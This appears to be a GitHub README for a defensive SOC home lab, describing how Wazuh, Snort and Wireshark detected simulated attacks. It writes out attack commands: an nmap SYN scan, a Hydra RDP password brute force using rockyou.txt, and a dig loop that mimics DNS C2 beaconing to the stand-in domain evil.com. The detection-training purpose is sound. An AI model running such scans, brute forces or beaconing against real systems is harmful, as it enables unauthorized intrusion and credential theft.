🛡️ Network Threat Detection Lab
Wazuh SIEM + Snort IDS + Wireshark + DNS Analysis
![Wazuh](https://img.shields.io/badge/Wazuh-4.7.5-blue?style=flat-square&logo=linux)
![Snort](https://img.shields.io/badge/Snort-IDS-red?style=flat-square)
![Wireshark](https://img.shields.io/badge/Wireshark-Packet_Analysis-1679A7?style=flat-square)
![MITRE](https://img.shields.io/badge/MITRE_ATT%26CK-T1046_T1110_T1071-orange?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-VMware-607078?style=flat-square)
A fully functional SOC home lab demonstrating real-time network threat detection using Wazuh SIEM, Snort IDS, Wireshark packet analysis, and DNS anomaly detection — built on a realistic three-VM architecture mirroring enterprise SOC deployments.
---
📋 Table of Contents
Lab Architecture
Tools & Technologies
Attack Scenarios
Screenshots
MITRE ATT&CK Mapping
Key Findings
Skills Demonstrated
---
🏗️ Lab Architecture
Three-VM setup on VMware Workstation Pro 17 using NAT network `192.168.52.0/24`:
VM	OS	IP Address	Role	Tools
Kali Linux	Kali 2025.2	192.168.52.133	Attacker	Nmap, Hydra, dig
Ubuntu Server	Ubuntu 22.04 LTS	192.168.52.142	SIEM / IDS Server	Wazuh, Snort, tcpdump, Wireshark
Windows Server	Windows Server 2022	192.168.52.139	Target / Victim	Wazuh Agent, RDP enabled
> The SIEM server is isolated from both attacker and target — mirroring real SOC architecture where monitoring infrastructure is separated from production systems.
---
🔧 Tools & Technologies
Tool	Version	Purpose
Wazuh SIEM	4.7.5	Host-based intrusion detection, log correlation, MITRE ATT&CK mapping
Snort IDS	2.9.15	Network intrusion detection, custom rule-based alerting
Wireshark	3.6.2	PCAP analysis, DNS traffic inspection
tcpdump	—	Packet capture on SIEM server
Nmap	—	SYN port scanning (T1046)
Hydra	—	RDP brute force (T1110.001)
dig	—	DNS C2 simulation (T1071.004)
MITRE ATT&CK	—	Threat technique mapping
VMware Workstation	Pro 17	Virtualization platform
---
⚔️ Attack Scenarios
Phase 1 — Network Reconnaissance
Technique: T1046 — Network Service Discovery
```bash
nmap -sS -T4 192.168.52.139
```
Kali launched a SYN scan against Windows Server
Snort rule SID:1000001 triggered — "Nmap SYN scan detected"
Detected: 20+ SYN packets from same source within 3 seconds
---
Phase 2 — RDP Brute Force
Technique: T1110.001 — Brute Force: Password Guessing
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.52.139 -t 4
```
Hydra performed dictionary attack against RDP port 3389
Snort SID:1000002 triggered — "RDP brute force attempt"
Wazuh Rule 60122 triggered — "Logon failure - Unknown user or bad password" (Level 5)
Windows EventCode 4625 generated in bulk
MITRE T1078 + T1531 automatically mapped by Wazuh
---
Phase 3 — DNS C2 Simulation
Technique: T1071.004 — Application Layer Protocol: DNS
```bash
for i in $(seq 1 50); do dig @8.8.8.8 malware-c2-$(cat /dev/urandom | tr -dc a-z | head -c8).evil.com; done
```
50 DNS queries to randomized subdomains of evil.com
tcpdump captured 108 DNS packets saved to dns_capture.pcap
Wireshark analysis revealed C2 beaconing IOCs:
High query volume to same domain
Random 8-character subdomains
All responses resolving to same IP (66.96.146.129)
---
📸 Screenshots
1. Wazuh Dashboard — Home
![Wazuh Dashboard Home](screenshots/01_wazuh_dashboard_home.png)
---
2. Wazuh Agent — Windows Server Active
![Wazuh Active Agent](screenshots/02_wazuh_winserver_active_agent.png)
> Windows Server 2022 agent (ID:001) connected and active at 192.168.52.139, Wazuh v4.7.5
---
3. Snort — Config Validation
![Snort Config Validation](screenshots/03_snort_config_validation.png)
> Snort successfully validated the configuration — ready for live detection
---
4. Snort — Custom Detection Rules
![Snort Custom Rules](screenshots/04_snort_custom_rules.png)
> Three custom rules in /etc/snort/rules/local.rules covering port scan, RDP brute force, and DNS volume
---
5. Phase 1 — Nmap Scan Detected by Snort
![Nmap Snort Alert](screenshots/05_nmap_attack_snort_alert.png)
> Snort console: SID:1000001 "Nmap SYN scan detected" firing repeatedly from 192.168.52.133 → 192.168.52.139
---
6. Phase 2 — RDP Brute Force (Snort)
![Snort RDP Brute Force](screenshots/06_snort_rdp_bruteforce_alert.png)
> Snort console: SID:1000002 "RDP brute force attempt" and MISC MS Terminal server requests on port 3389
---
7. Phase 2 — Brute Force Detection (Wazuh)
![Wazuh Brute Force](screenshots/07_wazuh_bruteforce_events.png)
> Wazuh Security Events: Rule 60122 (Level 5) logon failures with T1078 + T1531 MITRE mapping
---
8. Phase 3 — DNS C2 Traffic (Wireshark)
![Wireshark DNS](screenshots/08_wireshark_dns_capture.png)
> Wireshark PCAP: DNS queries to malware-c2-*.evil.com with randomized subdomains — IOC for DNS tunneling
---
9. MITRE ATT&CK Dashboard
![MITRE Dashboard](screenshots/09_wazuh_mitre_attack.png)
> Wazuh MITRE ATT&CK module: alert evolution spike, top tactics, and per-agent technique breakdown
---
10. Wazuh Security Events Overview
![Wazuh Security Events](screenshots/10_wazuh_security_events.png)
> 642 total alerts, 5 authentication failures, 68 successes — alert level spike visible at attack time
---
11. Wazuh Final Dashboard
![Wazuh Final Dashboard](screenshots/11_wazuh_final_dashboard.png)
> Wazuh home dashboard showing 1 active agent and all monitoring modules operational
---
🗺️ MITRE ATT&CK Mapping
Technique ID	Technique Name	Tactic	Attack Tool	Detection
T1046	Network Service Discovery	Discovery	Nmap	Snort SID:1000001
T1110.001	Brute Force: Password Guessing	Credential Access	Hydra	Snort SID:1000002 + Wazuh Rule 60122
T1071.004	Application Layer Protocol: DNS	Command & Control	dig loop	Wireshark PCAP
T1078	Valid Accounts	Defense Evasion, Persistence	Hydra	Wazuh Rule 60106
T1531	Account Access Removal	Impact	Hydra	Wazuh Security Events
---
🔍 Key Findings
642 total security events generated during the lab session
5 authentication failures and 68 authentication successes logged by Wazuh
108 DNS packets captured — Wireshark revealed DNS C2 beaconing IOCs
All 3 custom Snort rules triggered successfully against live attack traffic
Wazuh automatically mapped events to 5 MITRE ATT&CK techniques across multiple tactics
Dual detection coverage — both Snort (network) and Wazuh (host) detected the RDP brute force independently
---
🧠 Skills Demonstrated
Skill	Tool
SIEM deployment & agent configuration	Wazuh
Custom IDS rule writing	Snort
Real-time alert monitoring & triage	Snort console
Incident investigation & log correlation	Wazuh Dashboard
Packet capture & analysis	Wireshark / tcpdump
IOC identification	Wireshark
MITRE ATT&CK mapping	Wazuh + Manual
SOC architecture design	VMware
Windows Event Log analysis	Wazuh (EventCode 4625)
---
📁 Repository Structure
```
Network-Threat-Detection-Lab/
├── screenshots/
│   ├── 01_wazuh_dashboard_home.png
│   ├── 02_wazuh_winserver_active_agent.png
│   ├── 03_snort_config_validation.png
│   ├── 04_snort_custom_rules.png
│   ├── 05_nmap_attack_snort_alert.png
│   ├── 06_snort_rdp_bruteforce_alert.png
│   ├── 07_wazuh_bruteforce_events.png
│   ├── 08_wireshark_dns_capture.png
│   ├── 09_wazuh_mitre_attack.png
│   ├── 10_wazuh_security_events.png
│   └── 11_wazuh_final_dashboard.png
├── rules/
│   └── local.rules
├── Network_Threat_Detection_Lab_Report.pdf
└── README.md
```
---
👤 Author
Muhammed Anshad V  
SOC Analyst | EC-Council Certified SOC Analyst (CSA v2)  
📧 mhd.anshad.v@gmail.com  
🔗 LinkedIn | GitHub
---
Part of my SOC Portfolio — SOC Home Lab | Windows Log Analysis
